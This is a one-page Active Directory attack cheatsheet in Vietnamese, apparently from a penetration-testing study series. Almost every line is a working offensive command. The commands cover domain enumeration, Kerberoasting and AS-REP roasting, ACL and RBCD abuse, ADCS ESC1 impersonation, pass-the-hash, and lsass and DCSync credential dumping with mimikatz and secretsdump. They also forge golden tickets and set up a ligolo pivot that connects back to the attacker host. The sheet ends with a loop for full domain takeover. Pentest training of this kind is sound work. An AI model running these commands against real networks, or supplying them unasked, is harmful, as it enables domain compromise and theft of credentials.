# 12 — Cheatsheet 1 trang

Biến: `DC DOMAIN USER PASS HASH LHOST TARGET` (đặt theo file 00).

## Enum nhanh
```bash
nxc smb 10.10.10.0/24                                     # map mạng
nxc smb $DC -u '' -p '' --shares --users --pass-pol       # null
nxc smb $DC -u guest -p '' --rid-brute 10000
rpcclient -U "" -N $DC -c 'enumdomusers;querydispinfo'
ldapsearch -x -H ldap://$DC -b "DC=corp,DC=local" | grep -iE 'sAMAccount|desc|pwd'
kerbrute userenum -d $DOMAIN --dc $DC users.txt
enum4linux-ng -A $DC
```

## Có credential → enum
```bash
nxc smb/winrm/rdp/mssql/ldap 10.10.10.0/24 -u $USER -p $PASS   # (Pwn3d!)=admin
bloodhound-ce-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip
nxc smb $DC -u $USER -p $PASS --shares -M spider_plus -o DOWNLOAD_FLAG=True
nxc smb $DC -u $USER -p $PASS -M gpp_password
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.txt
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -o asrep.txt
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
nxc ldap $DC -u $USER -p $PASS -M laps ; nxc ldap $DC -u $USER -p $PASS --gmsa
impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC
```

## Hashcat modes (học thuộc)
```
NetNTLMv2 (Responder) ... -m 5600
NetNTLMv1 ............... -m 5500
AS-REP ($krb5asrep$23) . -m 18200
Kerberoast RC4 ($23) ... -m 13100
Kerberoast AES256 ($18)  -m 19700
NTLM (dump) ............ -m 1000
DCC2 / mscash2 ......... -m 2100
KeePass ................ -m 13400
hashcat <file> rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## ACL abuse (bloodyAD)
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password target 'New1!'
bloodyAD ... add groupMember 'GROUP' $USER
bloodyAD ... set owner target $USER ; bloodyAD ... add genericAll target $USER
bloodyAD ... add dcsync $USER
certipy shadow auto -u $USER@$DOMAIN -p $PASS -account target -dc-ip $DC
python3 targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC
```

## RBCD
```bash
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil1!' "$DOMAIN/$USER:$PASS" -dc-ip $DC
impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to 'TARGET$' "$DOMAIN/$USER:$PASS" -dc-ip $DC
impacket-getST -spn cifs/target.$DOMAIN -impersonate Administrator "$DOMAIN/EVIL$:Evil1!" -dc-ip $DC
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass target.$DOMAIN
```

## ADCS ESC1
```bash
certipy req  -u $USER@$DOMAIN -p $PASS -ca "$CA" -template "$TPL" -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC         # → NT hash + ccache
```

## Lateral / exec
```bash
nxc smb $T -u $USER -H $HASH --local-auth               # PtH
evil-winrm -i $T -u $USER -H $HASH
impacket-wmiexec  $DOMAIN/$USER@$T -hashes :$HASH       # kín hơn psexec
impacket-psexec   $DOMAIN/$USER@$T -hashes :$HASH       # SYSTEM
impacket-getTGT $DOMAIN/$USER -hashes :$HASH -dc-ip $DC # overpass-the-hash
xfreerdp /u:$USER /pth:$HASH /v:$T /cert:ignore
```

## SeImpersonate → SYSTEM (Windows)
```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\PrintSpoofer64.exe -i -c cmd
```

## Dump credential
```bash
impacket-secretsdump $DOMAIN/$USER:$PASS@$T               # SAM+LSA+DCC2
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc      # DCSync toàn domain
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
nxc smb $T -u $USER -p $PASS --sam --lsa --dpapi -M lsassy
pypykatz lsa minidump lsass.dmp
```
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID_lsass> C:\Users\Public\l.dmp full
mimikatz # privilege::debug ; sekurlsa::logonpasswords ; lsadump::dcsync /user:krbtgt
```

## Golden / Silver ticket
```bash
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain $DOMAIN Administrator       # Golden
impacket-ticketer -nthash <svc>    -domain-sid <SID> -domain $DOMAIN -spn MSSQLSvc/sql:1433 Administrator  # Silver
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC | grep "Domain SID"
```

## Pivot (ligolo-ng)
```bash
# Kali
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
sudo ip route add 172.16.1.0/24 dev ligolo
# Agent (Windows):  .\agent.exe -connect LHOST:11601 -ignore-cert   → ligolo: session; start
```

## Kerberos lỗi thường gặp
```
KRB_AP_ERR_SKEW      → đồng bộ giờ: sudo ntpdate -u $DC
PRINCIPAL_UNKNOWN    → sai tên/realm, thiếu /etc/hosts
KDC_ERR_PREAUTH      → sai mật khẩu (nhưng user tồn tại)
Must dùng FQDN + /etc/krb5.conf cho mọi lệnh -k
```

## Vòng lặp vàng
```
credential → nxc mọi giao thức/máy → BloodHound → enum (share/GPP/roast/ADCS/LAPS/deleg)
→ foothold → whoami /priv → SYSTEM → dump creds → (credential mới → lặp lại) → DCSync → proof
```
